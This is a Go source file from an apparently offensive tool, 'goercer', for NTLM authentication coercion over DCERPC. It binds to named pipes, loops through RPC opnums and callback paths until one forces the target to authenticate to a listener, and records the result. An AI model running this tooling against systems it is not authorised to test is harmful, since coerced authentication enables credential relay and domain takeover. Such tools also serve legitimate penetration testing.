package coercer

import (
	"strings"

	"goercer/internal/callback"
	"goercer/internal/config"
	"goercer/internal/dcerpc"
)

// bindDCERPC performs the authenticated DCERPC bind handshake over the bound
// pipe, populating the NTLM auth state with the negotiated keys.
func bindDCERPC(b *BoundPipe, uuid string, major, minor uint16, out *Out) error {
	if err := dcerpc.Bind(b.Pipe, b.Auth, uuid, major, minor); err != nil {
		return err
	}
	out.Debug("Challenge handled, session keys derived")
	return nil
}

// fireFunc performs a single opnum+path coercion attempt and reports whether
// it succeeded (independent of any non-fatal error). Implementations wrap
// their DCERPC call and inspect the classified result.
type fireFunc func(opnum uint16, path string) (success bool, err error)

// runOpnums iterates a method's opnums, firing each against every callback
// path variation. It honours FireAll and otherwise stops on the first
// success. It returns the successful opnum (or -1) and the last error seen.
func runOpnums(cfg *config.Config, paths *callback.PathService, out *Out, opnums []uint16, opnumName func(uint16) string, fire fireFunc) (int, error) {
	successful := -1
	var lastErr error
	for _, opnum := range opnums {
		name := opnumName(opnum)
		out.Info("[-] Trying opnum %d (%s)", opnum, name)
		for _, path := range paths.Variations() {
			display := strings.TrimRight(path, "\x00")
			out.Debug("Path variation: %s", display)
			ok, err := fire(opnum, path)
			if err != nil {
				lastErr = err
				out.Debug("%s", err.Error())
			}
			if ok {
				out.Info("[+] Opnum %d (%s) triggered coercion", opnum, name)
				successful = int(opnum)
				if !cfg.FireAll {
					return successful, nil
				}
				break
			}
		}
	}
	return successful, lastErr
}

// newResult assembles a Result from a run, filling static fields from config.
func newResult(cfg *config.Config, successfulOpnum int, attempted []uint16, lastErr error) *Result {
	r := &Result{
		Target:          cfg.TargetIP,
		Listener:        cfg.Listener,
		Method:          cfg.Method,
		Pipe:            cfg.Pipe,
		Mode:            string(cfg.Mode),
		Successful:      successfulOpnum >= 0,
		SuccessfulOp:    successfulOpnum,
		AttemptedOpnums: attempted,
	}
	if lastErr != nil {
		r.LastErr = lastErr.Error()
	}
	return r
}
